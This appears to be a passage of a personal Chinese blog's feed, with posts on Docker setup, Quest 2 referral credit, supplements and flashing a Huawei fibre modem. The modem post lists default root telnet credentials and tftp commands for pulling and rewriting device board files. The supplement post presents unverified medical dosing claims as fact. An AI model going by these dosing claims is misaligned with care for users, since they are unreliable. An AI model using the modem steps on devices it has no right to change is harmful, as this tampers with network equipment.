class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">-v</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/volume2/docker/1panel/root:/root</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">-e</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">TZ=Asia/Shanghai</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #98C379">moelin/1panel:latest</span></span></code></pre></div></div></figure><p>正常进入系统后安装 openresty 和 mysql，查看到报错文件映射有问题。</p><p>因为文档教程的宿主机和容器内外映射路径是一样的，所以问题出在这里。</p><img src="/install_1panel_with_synology_docker/image-20240109181029560.png" class="" title="image-20240109181029560"><p>这里就拿 mysql举例，手动修改 compose 配置文件文件映射部分，我的实际目录是在 <code>/docker/1panel/opt/1panel/apps/mysql/mysql</code> 下（注意这里有两个 mysql）</p><figure class="shiki dockerfile"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 原始配置文件</span></span><span class="line"><span style="color: #ABB2BF">- ./data/:/var/lib/mysql</span></span><span class="line"><span style="color: #ABB2BF">- ./conf/my.cnf:/etc/my.cnf</span></span><span class="line"><span style="color: #ABB2BF">- ./log:/var/log/mysql</span></span><span class="line"><span style="color: #ABB2BF">- /etc/timezone:/etc/timezone:ro</span></span><span class="line"><span style="color: #ABB2BF">- /etc/localtime:/etc/localtime:ro</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 下面是我的配置文件</span></span><span class="line"><span style="color: #ABB2BF">- /volume2/docker/1panel/opt/1panel/apps/mysql/mysql/data/:/var/lib/mysql</span></span><span class="line"><span style="color: #ABB2BF">- /volume2/docker/1panel/opt/1panel/apps/mysql/mysql/conf/my.cnf:/etc/my.cnf</span></span><span class="line"><span style="color: #ABB2BF">- /volume2/docker/1panel/opt/1panel/apps/mysql/mysql/log:/var/log/mysql</span></span><span class="line"><span style="color: #ABB2BF">- /etc/timezone:/etc/timezone:ro</span></span><span class="line"><span style="color: #ABB2BF">- /etc/localtime:/etc/localtime:ro</span></span></code></pre></div></div></figure><p>同时在宿主机目录下面创建好没有创建的目录或者文件，空的就行，比如我这里就少了一个 <code>data</code> 文件夹和 <code>log</code> 文件，操作好后手动点击一下重建按钮。如果还是报错查看一下错误信息，如果是缺少文件之类的报错，操作之后直接点重启即可。</p><img src="/install_1panel_with_synology_docker/image-20240109184214820.png" class="" title="image-20240109184214820"><img src="/install_1panel_with_synology_docker/image-20240109181340506.png" class="" title="image-20240109181340506"><p>如果提示 &#x2F;etc&#x2F;timezone can’t find 什么的，同样用 ssh 执行一下下面的命令即可。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">touch /etc/timezone</span></span><span class="line"><span style="color: #abb2bf">echo &#39;Asia/Shanghai&#39; &gt; /etc/timezone</span></span></code></pre></div></div></figure><img src="/install_1panel_with_synology_docker/image-20240109184012054.png" class="" title="image-20240109184012054"><p>最后还是不用套娃了，在 VMM 里装了个 Rocky Linux 再装了个 1Panel，省心好多。希望此经验能帮助到大家。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;起初是家里 NAS 上 docker 跑的宝塔面板经常出问题，掉电重启之后 mysql 经常会异常停止，然后去面板上经常需要重新绑定账号，所以有迁移到 1Panel 的想法。&lt;/p&gt;
&lt;p&gt;首先使用 moelin&amp;#x2F;1panel 镜像，需要使用 SSH 进入NAS </summary>
      
    
    
    
    <category term="硬件" scheme="https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"/>
    
    
    <category term="群晖" scheme="https://blog.irec.moe/tags/%E7%BE%A4%E6%99%96/"/>
    
  </entry>
  
  <entry>
    <title>Quest 2 新设备领取30刀商店点数 &amp; 折腾记录</title>
    <link href="https://blog.irec.moe/quest2.html"/>
    <id>https://blog.irec.moe/quest2.html</id>
    <published>2023-09-16T12:00:00.000Z</published>
    <updated>2023-11-22T07:43:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Quest-2-新设备领取30刀商店点数-折腾记录"><a href="#Quest-2-新设备领取30刀商店点数-折腾记录" class="headerlink" title="Quest 2 新设备领取30刀商店点数 &amp; 折腾记录"></a>Quest 2 新设备领取30刀商店点数 &amp; 折腾记录</h2><p>官方的活动页面：<a href="https://www.meta.com/quest/referrals/">https://www.meta.com/quest/referrals/</a></p><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><p>1、你的设备是<strong>没被人领取过</strong>的。</p><p>2、账户<strong>创立时所用的 IP</strong> 是和邀请码同样地区的。</p><p>3、这个账户没有激活过 Quest 设备，不然点别人的推荐链接都接受不了。</p><p>4、不管你设备用了多久，只要没被人领过就能薅到这30刀。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>起初是我想买个正版的 BS，看到有人推荐去买兑换码，然后去臭鱼搜了搜，发现别人是用送的礼金买的兑换码，再转手卖。于是我也想折腾一下礼金。我机器是买的二手，想看看前任机主有没有薅过，如果没薅过的话就把 VD 给入正了。折腾的过程中问题不断，网上的信息也是少的可怜，根据我的检索能力是找不到什么有用的信息的了。</p><p>臭鱼上有代激活的，我想着应该不难，最后摸索了一下总结出了经验。</p><h3 id="具体步骤如下"><a href="#具体步骤如下" class="headerlink" title="具体步骤如下"></a>具体步骤如下</h3><p>1、确定新的账户能正常接受推荐链接，也就是 ACCEPT REFERRAL 能点进去不报错。</p><p>2、头显激活过 -&gt; 恢复出厂，没有激活过直接跳过这步。</p><p>3、手机登录 Meta Quest APP，然后和头显正常配对。</p><p>4、一般配对成功后会收到一条通知，可以去 设置 -&gt; 支付方式，查看是否有礼金。</p><p><strong>注意：注册成功后就不要切换节点了，我已经死了一个号了。暂时不知道是 APP 内通过联网检测到了还是头显检测到了，我这边是网关代理模式，用了一会这个小蓝条就消失了</strong>。</p><p>TIP2：如果小蓝条消失了，可以退出登录之后换之前用的节点在登陆，可能小紫条就又跑出来了。暂时不清楚这个机制是什么，最核心的还是不要更换 IP。</p><p><strong>建议阅读后文后再做尝试！</strong></p><p><strong>建议阅读后文后再做尝试！</strong></p><p><strong>建议阅读后文后再做尝试！</strong></p><h3 id="关于领取不到的问题"><a href="#关于领取不到的问题" class="headerlink" title="关于领取不到的问题"></a>关于领取不到的问题</h3><p>首先是账号地区问题，如果创立时用的其他地区的，就会提示下面等类似的提示。要是有这个提示就别折腾了，你的账号在一开始就已经是非活动地区了，需要你<strong>重新创建一个账户</strong>，和用的机场一点关系都没有。</p><blockquote><p>unavailable in your area oculus referrals are currently unavailable in your area.</p></blockquote><p>如果确定地区正确的话，登录官方的<a href="https://www.oculus.com/referrals/">推荐网址</a>是这样显示的</p><img src="/quest2/image-20230916143639680.png" class="" title="image-20230916143639680"><p>接受者领取成功是这样一个提示</p><img src="/quest2/image-20230916143522103.png" class="" title="image-20230916143522103"><p>如下图是账号已经被送去其他区域的例子，同样的网络环境下打开同样的邀请链接显示不同的内容</p><img src="/quest2/Snipaste_2023-10-09_12-50-49.png" class="" title="Snipaste_2023-10-09_12-50-49"><p><strong>（2023-11更新）现在 Q3 出了之后界面变成这样了</strong></p><img src="/quest2/image-20231011215514805.png" class="" title="image-20231011215514805"><p>接下来就是要用到这个新注册的账户登录手机上的 Meta Quest 软件，然后头显恢复出厂，用这个账户配对，配对成功之后就能在 设置 -&gt; 支付方式 看到有可用的礼金了。</p><p>注意：注册时和登录时需要全程挂和车头同样区域的，具体自测</p><h4 id="可用地区"><a href="#可用地区" class="headerlink" title="可用地区"></a><strong>可用地区</strong></h4><blockquote><p>Japan, Spain, Switzerland, Norway, Belgium, Netherlands, France, Taiwan, Finland, New Zealand, U.S. ,Australia, Austria, Canada, Denmark, Iceland, Ireland, Italy, Poland, United Kingdom, South Korea, and Sweden.</p></blockquote><p>我用的台湾的节点（此节点已被送中，但实际 IP 地理位置在台湾），全程挂着正常注册，之后手机上的 APP 中的 Menu 菜单能显示蓝色的 banner，就算成功了。</p><img src="/quest2/image-20230916144928553.png" class="" title="image-20230916144928553"><img src="/quest2/image-20230916144338562.png" class="" title="image-20230916144338562"><p>悲，我和我朋友的设备前任机主都领过了，嫖不到哩。</p><h3 id="关于节点地区的问题"><a href="#关于节点地区的问题" class="headerlink" title="关于节点地区的问题"></a>关于节点地区的问题</h3><p>主要有四种节点类型</p><ul><li>第一种 添加手机号提示技术错误 IP不干净</li><li>第二种 出邀请链接 不出钱包 IP是对应地区的 但是具体位置被送中</li><li>第三种 出钱包 不出邀请链接 说明IP是干净的，但是IP的实际位置不在活动区域</li><li>第四种 也是最完美的 钱包和邀请链接都会出现。IP和实际位置相符合，没有被标记，也就是土著环境</li></ul><p>其中第一种可以和第二种和第三种相叠加，也可能是 IDC 的 IP 段不行，Meta 为了防止短信轰炸所以不让发短信。</p><p><strong>所以想要出现推荐链接的话只要第二种和第四种环境即可</strong>。</p><h3 id="具体测试过程"><a href="#具体测试过程" class="headerlink" title="具体测试过程"></a>具体测试过程</h3><h4 id="通过查询经纬度判断-Meta-数据库中-IP-标记所在地区"><a href="#通过查询经纬度判断-Meta-数据库中-IP-标记所在地区" class="headerlink" title="通过查询经纬度判断 Meta 数据库中 IP 标记所在地区"></a>通过查询经纬度判断 Meta 数据库中 IP 标记所在地区</h4><p>打开 <a href="https://auth.meta.com/settings/vyi/">https://auth.meta.com/settings/vyi/</a></p><p>倒数第二项 <strong>安全与登录信息</strong></p><img src="/quest2/image-20231122150600227.png" class="" title="image-20231122150600227"><p>如果节点没有被送中的话（IP实际位置和标记位置相同），手机端会显示钱包，也就是这个 IP 标记位置没有被污染，如果被污染了就不会显示钱包了。</p><img src="/quest2/image-20231014114326059.png" class="" title="image-20231014114326059"><p>发现机场很多节点被送中，之前注册的日区号也显示成中国了</p><img src="/quest2/image-20231014120556947.png" class="" title="image-20231014120556947"><h4 id="使用日区注册的账户和日区节点"><a href="#使用日区注册的账户和日区节点" class="headerlink" title="使用日区注册的账户和日区节点"></a>使用日区注册的账户和日区节点</h4><p>会话里显示 <strong>Windows 电脑 · Inzai-shi, Chiba, Japan</strong></p><img src="/quest2/image-20231014154724941.png" class="" title="image-20231014154724941"><p>但在日区节点下用台区账户重新登录之后显示</p><img src="/quest2/image-20231014154914883.png" class="" title="image-20231014154914883"><p>说明邀请是跟随当前账户所注册的地区的。</p><h4 id="2023-11-12-测试-成功领取到礼金"><a href="#2023-11-12-测试-成功领取到礼金" class="headerlink" title="2023-11-12 测试 成功领取到礼金"></a>2023-11-12 测试 成功领取到礼金</h4><p>使用 <strong>中国-台湾 VPDN 嘉义游戏专线 C01 Netflix 动画疯 60.249.25.21</strong> 注册</p><p>账户不出钱包，出小蓝条。</p><img src="/quest2/image-20231122152556670.png" class="" title="image-20231122152556670"><p>标记位置在上海 </p><blockquote><p>纬度：31.176，经度：121.504：这个位置位于中国上海市的某个地方。</p></blockquote><img src="/quest2/image-20231122152403273.png" class="" title="image-20231122152403273"><p>测试打开邀请链接正常</p><img src="/quest2/image-20231122152639844.png" class="" title="image-20231122152639844"><img src="/quest2/image-20231122152706513.png" class="" title="image-20231122152706513"><img src="/quest2/image-20231122152729951.png" class="" title="image-20231122152729951"><img src="/quest2/image-20231122152740335.png" class="" title="image-20231122152740335"><p>作为礼物购买测试</p><img src="/quest2/image-20231122153336996.png" class="" title="image-20231122153336996"><p>输入邮箱后赠送，绑卡支付即可</p><img src="/quest2/image-20231122153459457.png" class="" title="image-20231122153459457"><img src="/quest2/image-20231122153142935.png" class="" title="image-20231122153142935"><p>接收方通过收到的兑换码在商城成功兑换。</p><img src="/quest2/image-20231122152956301.png" class="" title="image-20231122152956301"><h5 id="2023-11-15-小蓝条消失，头显只激活过，开机向导都没走完，全程关机状态。"><a href="#2023-11-15-小蓝条消失，头显只激活过，开机向导都没走完，全程关机状态。" class="headerlink" title="2023-11-15 小蓝条消失，头显只激活过，开机向导都没走完，全程关机状态。"></a>2023-11-15 小蓝条消失，头显只激活过，开机向导都没走完，全程关机状态。</h5><img src="/quest2/image-20231122153651802.png" class="" title="image-20231122153651802"><h2 id="开发者模式"><a href="#开发者模式" class="headerlink" title="开发者模式"></a>开发者模式</h2><p><a href="https://dashboard.oculus.com/organizations/create/">https://dashboard.oculus.com/organizations/create/</a></p><p>同样的，如果开发者模式要求开 2FA 有奇怪的问题，最终还是你的节点问题，我用下面说的节点成功添加了 GV 的手机号码。</p><h3 id="可添加手机号节点"><a href="#可添加手机号节点" class="headerlink" title="可添加手机号节点"></a>可添加手机号节点</h3><p>切换节点后需要登入登出两次才生效</p><ul><li>中国-台湾 VPDN 嘉义游戏专线 C01 Netflix 动画疯 60.249.25.55</li><li>香港 油尖旺御金·国峯 環球全域電訊 C08</li><li>東京 上海移動 測試</li></ul><p>猜测是 Meta 为了防止短信轰炸限制了一部分 IP 添加手机号。</p><img src="/quest2/image-20230916152011848.png" class="" title="image-20230916152011848"><img src="/quest2/image-20230916152026462.png" class="" title="image-20230916152026462"><p>顺利开启开发者模式。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Meta 和 Facebook 一样，检测地区比较恶心。会把账号的地区锁住，导致没法用一些功能，之后使用要特别注意，不要切换节点的地区了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Quest-2-新设备领取30刀商店点数-折腾记录&quot;&gt;&lt;a href=&quot;#Quest-2-新设备领取30刀商店点数-折腾记录&quot; class=&quot;headerlink&quot; title=&quot;Quest 2 新设备领取30刀商店点数 &amp;amp; 折腾记录&quot;&gt;&lt;/a&gt;Quest</summary>
      
    
    
    
    <category term="硬件" scheme="https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"/>
    
    
    <category term="VR" scheme="https://blog.irec.moe/tags/VR/"/>
    
  </entry>
  
  <entry>
    <title>iHerb 初体验</title>
    <link href="https://blog.irec.moe/iherb.html"/>
    <id>https://blog.irec.moe/iherb.html</id>
    <published>2023-08-19T04:00:00.000Z</published>
    <updated>2023-08-25T14:40:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>经群友介绍了解到了 NAC 和南非醉茄之类的 <strong>保健品</strong>。</p><blockquote><p>[Boom快讯]  8月17日开始 Iherb 全场 7.5折</p><p>满299元85折，499元75折 折扣码：7XBUY<br>活动时间：8.17-8.24（北京时间凌晨1点） 不限制使用次数～</p><p>由于最近二阳大爆发 , 所以推荐大家一些和 COVID有关的产品 ….<br>之前发了链接 , 然而群友们表示完全不懂 , 要我介绍一下…<br>我也只能结合自己学到的以及”人体爆炸实验”的亲身感受简单的做介绍…毕竟是野鸡大学毕业不是医科大学…</p><p>首先 , 最有用的 , 就是 NAC , 国内属于处方药叫 乙酰半胱氨酸 .<br>平时作为护肝保健的用量为 600mg , 1天 …<br>COVID 感染后用量 加到 600mg X 3  , 可以有效防止COVID引起的各类并发症 …<br>早在原始毒株的时候 欧洲的专家就用 雾化吸入NAC的方式给重症病人保命…<br>然而国内铺天盖地的”莲花清瘟” 完全覆盖了真正有用的药品 …<br>NAC 记得买片剂 , 千万别买胶囊 …比臭豆腐还要臭….</p><p>接下来是 维生素 D3+K2…<br>具体看一下B呼 :<br><a href="https://zhuanlan.zhihu.com/p/415774012">https://zhuanlan.zhihu.com/p/415774012</a></p><p>————————————————————————</p><p>最后…因为这里有大量服用喹硫平的人 …<br>再推荐一个南非醉茄 :<br><a href="https://cn.iherb.com/pr/emerald-laboratories-elevated-mood-with-affron-saffron-extract-60-vegetable-caps/116437">https://cn.iherb.com/pr/emerald-laboratories-elevated-mood-with-affron-saffron-extract-60-vegetable-caps/116437</a><br>家里老年人每天晚上做噩梦 , 像武打片一样 , 吃了这个睡的香的1B … 再也没有从床上掉到地上过…<br>同样也适用于平时情绪紧张…容易生气的人 …</p></blockquote><p>自己近期情绪不稳定，经常失眠，白天没劲，靠运动弥补好了一点，但不明显。遂准备购入一些，希望不是 placebo。</p><p>查了查资料应该是有效果的，遂小购入一点试试看，价格还能接受。</p><h2 id="以下是介绍"><a href="#以下是介绍" class="headerlink" title="以下是介绍"></a>以下是介绍</h2><h3 id="NAC（乙酰半胱氨酸）"><a href="#NAC（乙酰半胱氨酸）" class="headerlink" title="NAC（乙酰半胱氨酸）"></a>NAC（乙酰半胱氨酸）</h3><p>NAC，国内属于处方药叫 乙酰半胱氨酸</p><p>可作为护肝保健品，每天600mg * 1。</p><p>感染 COVID 后用量加到 600mg X 3  , 可以有效防止 COVID 引起的各类并发症。</p><p>NAC 记得买片剂 , 千万别买胶囊 …比臭豆腐还要臭….</p><p>注意事项参照其他资料，建议刚开始小剂量开始尝试。</p><h3 id="维生素-D3-K2"><a href="#维生素-D3-K2" class="headerlink" title="维生素 D3 + K2"></a>维生素 D3 + K2</h3><p><a href="https://zhuanlan.zhihu.com/p/415774012">https://zhuanlan.zhihu.com/p/415774012</a></p><p>提高血清维生素D含量，会影响冠状病毒COVID-19患者的死亡率。</p><p>各地区有色人种血清维生素D的缺乏率在69.2%~82.5%。</p><p>作者表示，高度缺乏维生素D 的原因，除了现代化的办公室生活方式（家-汽车-办公室-汽车-家），还和纬度、皮肤色素沉着程度、季节和膳食摄入量（鱼肉、动物肝脏、发酵食品等）有重要关系，而口服维生素D3是预防不足最简单有效的方式。</p><p>针对口服D3过量，可能会导致的高钙血症、肾结石等情况，可以通过补充K2来调节，K2羧化可以激活含有γ-羧基谷氨酸的蛋白质（骨钙素），活化的骨钙素将钙沉淀在骨骼中，而非活化的骨骼素会抑制骨骼对钙的吸收。</p><p>所以当血清维生素D较高，增加骨钙素合成率时，就需要K2作为拮抗剂，来避免血管硬化、钙化。</p><p>另外考虑到代谢维生素D的酶都需要镁，所以作者<strong>强烈建议考虑同时摄入K2和镁。</strong></p><h3 id="南非醉茄"><a href="#南非醉茄" class="headerlink" title="南非醉茄"></a>南非醉茄</h3><p><a href="https://zhuanlan.zhihu.com/p/347454352">https://zhuanlan.zhihu.com/p/347454352</a></p><p>有 KSM-66 和 Sensoril 两种</p><p>Sensoril和KSM-66的区别:</p><p>“Sensoril® ashwagandha powder also contains a greater total concentration of biologically active constituents, containing 10% (or greater) withanolides; KSM-66 ashwagandha powder is standardized to contain 5% (or greater) withanolides and doesn’t include any ashwagandha leaf constituents.”</p><p>也就是说Sensoril的醉茄内酯含量是同量KSM-66的两倍。并且含有醉茄叶提取物。</p><p>效果来说：</p><p>“Anecdotally, most people report that Sensoril is the better “nighttime” ashwagandha supplement, while KSM-66 is superior for daytime use and stimulating cognitive function. For stress relief and general well-being, both will do just fine.”</p><p>KSM-66对提高白天专注度更有效，Sensoril对提高睡眠质量更有效。降压效果来说是类似的。</p><p>我是选择的后者，群友也推荐后者。</p><h2 id="下单作业"><a href="#下单作业" class="headerlink" title="下单作业"></a>下单作业</h2><p>在 <a href="https://www.iherb.com/?rcode=JIV1863">iHerb</a> 购入，有7夕活动，优惠码 <strong>7XBUY</strong> 。到8月23日失效。</p><p>我就购入了这三款，具体功用上文有介绍</p><img src="/iherb/image-20230819114625229.png" class="" title="image-20230819114625229"><p><a href="https://www.iherb.com/pr/source-naturals-n-acetyl-cysteine-600-mg-120-tablets/1291">https://www.iherb.com/pr/source-naturals-n-acetyl-cysteine-600-mg-120-tablets/1291</a></p><p><a href="https://www.iherb.com/pr/life-extension-optimized-ashwagandha-60-vegetarian-capsules/16416">https://www.iherb.com/pr/life-extension-optimized-ashwagandha-60-vegetarian-capsules/16416</a></p><p><a href="https://www.iherb.com/pr/now-foods-mega-d-3-mk-7-180-mcg-5-000-iu-60-veg-capsules/79866">https://www.iherb.com/pr/now-foods-mega-d-3-mk-7-180-mcg-5-000-iu-60-veg-capsules/79866</a></p><p>当然也可以选其他品牌的，记得看 D3 K2 含量，有些比较低。</p><p>当天下单，次日就已经发货了。</p><img src="/iherb/image-20230819114753976.png" class="" title="image-20230819114753976"><p>下单的时候可以用我的优惠码 <strong>JIV1863</strong> ，再用商城自带的优惠码，可以享受到优惠的同时我也吃到  AFF。你也可以注册一个小号互相刷 AFF，购物可以折抵。</p><p>据说还有一个<a href="https://cn.iherb.com/pr/paradise-herbs-orac-energy-greens-120-vegetarian-capsules/23550">大绿胶囊</a>，不过不能夏天买，等这一阵过去再考虑购入否。</p><h2 id="品牌选购"><a href="#品牌选购" class="headerlink" title="品牌选购"></a>品牌选购</h2><p>见<a href="@boomtechreviews">群友</a>总结的<a href="https://t.me/boomtechreviews/1202">攻略</a></p><img src="/iherb/image-20230819115729032.png" class="" title="image-20230819115729032"><p>-&#x3D;爆炸实验&#x3D;- 第二季第3集 - 52个常见抗衰补充剂品牌TierList v2.1</p><p>TierList 用在最多的地方…就是Youtube上的原P(roducer). 我把它切换成长方形图标正好可以用来放各大品牌的LOGO .<br>前几天…在玩B站的时候我得知了这世界上有很多强迫症患者 , 于是我又花了1个多小时把这50个Logo居中并调整到了合适的大小.<br><a href="https://tiermaker.com/list/health-fitness/regular-anti-aging-supplement-brands-tier-list-15706019/2904562">https://tiermaker.com/list/health-fitness/regular-anti-aging-supplement-brands-tier-list-15706019/2904562</a></p><p>以上品牌Ranking结合了美国ConsumerLab的评价 , 自身体验 , 群友介绍 , 以及花费大量时间的综合资料查询…所有的品牌均可通过以下3大正规官方授权渠道很方便的买到: Amazon自营 , 京东国际自营或官方旗舰店 , iherb .<br>淘宝或者京东亚马逊第三方是千万不能买的 , 几年前朋友就买到过面粉丸子做的假GNC褪黑素了…美国英国市场上那堆假NMN也出自于中国…全球三大造假大国 : 中国印度韩国 , China No.1 !<br>因此确保渠道正规之后 , 接下来才是考虑品牌的问题 …  </p><p>至于这些品牌具体怎么样 , 您需要付费57美元一年订阅 : <a href="https://www.consumerlab.com/">https://www.consumerlab.com/</a><br>这是全球最公正的补充剂第三方实验室…9年前它来中国推广过, 然而中国人民可能觉得57美元用来去东莞保健效果比看这种文章效果更好点…</p><p>接下来频道中将上传整个Consumerlab打包后的115份付费测评结果~</p><h2 id="待更新…"><a href="#待更新…" class="headerlink" title="待更新…"></a>待更新…</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;经群友介绍了解到了 NAC 和南非醉茄之类的 &lt;strong&gt;保健品&lt;/strong&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[Boom快讯]  8月17日开始 Iherb 全场 7.5折&lt;/p&gt;
&lt;p&gt;满299元85折，499元75折 折扣码：7XBUY&lt;br&gt;活动时</summary>
      
    
    
    
    <category term="生活" scheme="https://blog.irec.moe/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="续命" scheme="https://blog.irec.moe/tags/%E7%BB%AD%E5%91%BD/"/>
    
    <category term="保健" scheme="https://blog.irec.moe/tags/%E4%BF%9D%E5%81%A5/"/>
    
  </entry>
  
  <entry>
    <title>更换 HS1845X6 光猫并且使用 EasyMesh 进行组网的记录</title>
    <link href="https://blog.irec.moe/fuck_chinamobile.html"/>
    <id>https://blog.irec.moe/fuck_chinamobile.html</id>
    <published>2023-08-11T12:00:00.000Z</published>
    <updated>2023-08-19T07:24:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="设备情况"><a href="#设备情况" class="headerlink" title="设备情况"></a>设备情况</h2><p>湖南电信EPON版本的 HS8145X6</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>设备类型:</td><td>Epon</td></tr><tr><td>生产厂家:</td><td>华为</td></tr><tr><td>设备型号:</td><td>HS8145X6</td></tr><tr><td>设备标识号:</td><td>1413FB-408411413FB8D7959</td></tr><tr><td>硬件版本:</td><td>210D.A</td></tr><tr><td>软件版本:</td><td>V5.21.C00S050</td></tr></tbody></table><img src="/fuck_chinamobile/image-20230808230051218.png" class="" title="image-20230808230051218"><img src="/fuck_chinamobile/image-20230808225256250.png" class="" title="image-20230808225256250"><p>普通的超密无法进入，重置需要管理员密码</p><img src="/fuck_chinamobile/image-20230808225332916.png" class="" title="image-20230808225332916"><p>尝试使用论坛大佬制作的 R20 开 TELNET 工具。</p><img src="/fuck_chinamobile/image-20230808225526822.png" class="" title="image-20230808225526822"><p>telnet 无效，遂放弃。</p><img src="/fuck_chinamobile/image-20230808225443017.png" class="" title="image-20230808225443017"><p>其实这种是有办法破解的，是使用上述提到的使能工具，能让光猫直接执行相关的命令，比如说获取里面的配置文件，tftp 传到电脑上然后解密即可。</p><p>我是找咸鱼 <strong>hwont</strong> 大佬，他在我电脑上用使能工具然后传回来一个文件，他拉回去解密然后给我，5分钟搞定，当然文件他是不会给的，有兴趣的话可以自行研究。如果菊花把这个使能工具封禁了或者需要相关授权才能用的话，咸鱼上的配置光猫的会倒一片。</p><h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="改华为界面"><a href="#改华为界面" class="headerlink" title="改华为界面"></a>改华为界面</h3><p>首先去 192.168.1.1:8080 使用超密登录进去，把 TELNET 防火墙允许，没有补全的照常补全，这里因为我已经补全过了所以说不需要在此补全了。</p><p>PS：echo20_Telnet_Shell.bin 这个文件是自带开 telnet 功能的，可以用 HWFW 解包打开，提取出来 EFS 看看就知道了，稍微懂一点 Linux 的也能依葫芦画瓢做出来一些东西的。</p><img src="/fuck_chinamobile/image-20230811215739061.png" class="" title="image-20230811215739061"><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">telnet</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">192.168</span><span style="color: #98C379">.1.1</span></span><span class="line"><span style="color: #61AFEF">root</span></span><span class="line"><span style="color: #61AFEF">adminHW</span></span><span class="line"><span style="color: #61AFEF">su</span></span><span class="line"><span style="color: #61AFEF">shell</span></span><span class="line"><span style="color: #56B6C2">cd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/mnt/jffs2</span></span><span class="line"><span style="color: #61AFEF">tftp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-pl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hw_boardinfo</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">192.168</span><span style="color: #98C379">.1.10</span><span style="color: #ABB2BF"></span><span style="color: #98C379">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">传回电脑</span></span><span class="line"><span style="color: #61AFEF">tftp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-gr</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hw_boardinfo</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">192.168</span><span style="color: #98C379">.1.10</span><span style="color: #ABB2BF"></span><span style="color: #98C379">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">传回光猫</span></span><span class="line"><span style="color: #61AFEF">cp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hw_boardinfo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hw_boardinfo.bak</span><span style="color: #ABB2BF"></span><span style="color: #98C379">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">复制一份</span></span></code></pre></div></div></figure><p>使用 tftp 传回 hw_boardinfo ，用 HW Dollar 打开，1a,1b 改 COMMON，如图所示</p><img src="/fuck_chinamobile/image-20230811214513259.png" class="" title="image-20230811214513259"><p>之后再传回光猫，重启即可，再次进入网关界面就会变成华为界面了。</p><h3 id="配置ONT认证及上网参数"><a href="#配置ONT认证及上网参数" class="headerlink" title="配置ONT认证及上网参数"></a>配置ONT认证及上网参数</h3><p>首先要修改认证方式和 SN，配置好上网参数。</p><p>注：我所在区域只认证光猫SN，以及用的光猫都没有 LOID 选项。有一次改了一个友华光猫换地区之后出现 LOID，结果在电信宽带上认证不过，其他猫改LOID 和 PASSWORD 是可以的，基本确定我这边光猫固件锁死模式了。都是些二线厂商的猫。</p><img src="/fuck_chinamobile/image-20230809002947794.png" class="" title="image-20230809002947794"><p>我这里是湖南郴州移动的参数，不同地市VID都不同，仅供参考。</p><img src="/fuck_chinamobile/image-20230809003235124.png" class="" title="image-20230809003235124"><p>然后修改一下 DHCP 服务器，无缝替换到原来的设备上。</p><img src="/fuck_chinamobile/image-20230809004636039.png" class="" title="image-20230809004636039"><h3 id="拆机-上机"><a href="#拆机-上机" class="headerlink" title="拆机&amp;上机"></a>拆机&amp;上机</h3><img src="/fuck_chinamobile/image-20230809025031047.png" class="" title="image-20230809025031047"><img src="/fuck_chinamobile/image-20230809025039614.png" class="" title="image-20230809025039614"><img src="/fuck_chinamobile/image-20230809025051077.png" class="" title="image-20230809025051077"><img src="/fuck_chinamobile/image-20230809025058990.png" class="" title="image-20230809025058990"><h3 id="实测效果"><a href="#实测效果" class="headerlink" title="实测效果"></a>实测效果</h3><p>正常认证以及成功拨号，可以看到 BRAS 是 ME60，并且 IPV6 前缀拿到 &#x2F;60。</p><img src="/fuck_chinamobile/image-20230809010927146.png" class="" title="image-20230809010927146"><img src="/fuck_chinamobile/image-20230809011600558.png" class="" 